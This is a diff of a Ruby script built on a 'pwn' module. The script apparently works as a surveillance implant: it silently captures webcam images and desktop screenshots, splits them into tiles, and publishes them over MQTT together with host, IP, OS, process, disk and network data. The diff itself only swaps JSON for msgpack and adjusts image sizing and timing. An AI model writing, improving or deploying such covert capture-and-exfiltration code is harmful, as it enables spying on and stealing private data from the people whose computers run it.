@@ -1,6 +1,6 @@
 require_relative 'pwn'
 require 'base64'
-require 'json'
+require 'msgpack'
 require 'os'
 require 'open-uri'
 require 'sys/proctable'
@@ -99,7 +99,7 @@ end
 def webcam()
   if OS.windows? then
     `WebCamImageSave.exe /capture /Filename webcam.png`
-    `magick mogrify -resize 25% webcam.png`
+    `magick mogrify -resize 50% webcam.png`
     `magick convert -crop 10%x10% webcam.png webcam/webcam%d.png`
   else
     `whoami`
@@ -125,17 +125,12 @@ pwn = Pwn.new
 # 	end
 # end
 
-last_ping_time_host_ip_os = Time.now
-last_ping_time_cpu_memory = Time.now
-last_ping_time_disk_network_process = Time.now
-last_ping_time_webcam_desktop = Time.now
-
 Thread.new {
   loop do
     if (pwn.internals[:mqtt].connected?) then
-      pwn.publish('reedleoneil/system_info/host', host().to_json)
-      pwn.publish('reedleoneil/system_info/ip', ip().to_json, true, 2)
-      pwn.publish('reedleoneil/system_info/os', os().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/host', host().to_msgpack)
+      pwn.publish('reedleoneil/system_info/ip', ip().to_msgpack, true, 2)
+      pwn.publish('reedleoneil/system_info/os', os().to_msgpack, true, 2)
       sleep 60
     end
   end
@@ -144,8 +139,8 @@ Thread.new {
 Thread.new {
   loop do
     if (pwn.internals[:mqtt].connected?) then
-      pwn.publish('reedleoneil/system_info/cpu', cpu().to_json, true, 2)
-      pwn.publish('reedleoneil/system_info/memory', memory().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/cpu', cpu().to_msgpack, true, 2)
+      pwn.publish('reedleoneil/system_info/memory', memory().to_msgpack, true, 2)
       sleep 3
     end
   end
@@ -154,9 +149,9 @@ Thread.new {
 Thread.new {
   loop do
     if (pwn.internals[:mqtt].connected?) then
-      pwn.publish('reedleoneil/system_info/disk', disk().to_json, true, 2)
-      pwn.publish('reedleoneil/system_info/network', network().to_json, true, 2)
-      pwn.publish('reedleoneil/system_info/processes', processes().to_json, true, 2)
+      pwn.publish('reedleoneil/system_info/disk', disk().to_msgpack, true, 2)
+      pwn.publish('reedleoneil/system_info/network', network().to_msgpack, true, 2)
+      pwn.publish('reedleoneil/system_info/processes', processes().to_msgpack, true, 2)
       sleep 30
     end
   end
@@ -167,17 +162,20 @@ Thread.new {
     if (pwn.internals[:mqtt].connected?) then
       webcam()
       for i in 0..99
-        w = Base64.strict_encode64(File.binread('webcam/webcam' + i.to_s + '.png'))
-        p payload = { :cell => i, :img => w }.to_json
+        p "w: #{i.to_s}"
+        payload = { :cell => i, :img => File.binread('webcam/webcam' + i.to_s + '.png') }.to_msgpack
         pwn.publish('reedleoneil/webcam', payload, false, 2)
         pwn.internals[:mqtt].loop_write
+        sleep 0.1
       end
+      sleep 3
       desktop()
       for i in 0..99
-        d = Base64.strict_encode64(File.binread('desktop/desktop' + i.to_s + '.png'))
-        p payload = { :cell => i, :img => d }.to_json
+        p "d: #{i.to_s}"
+        payload = { :cell => i, :img => File.binread('desktop/desktop' + i.to_s + '.png') }.to_msgpack
         pwn.publish('reedleoneil/desktop', payload, false, 2)
         pwn.internals[:mqtt].loop_write
+        sleep 0.1
       end
       sleep 90
     end
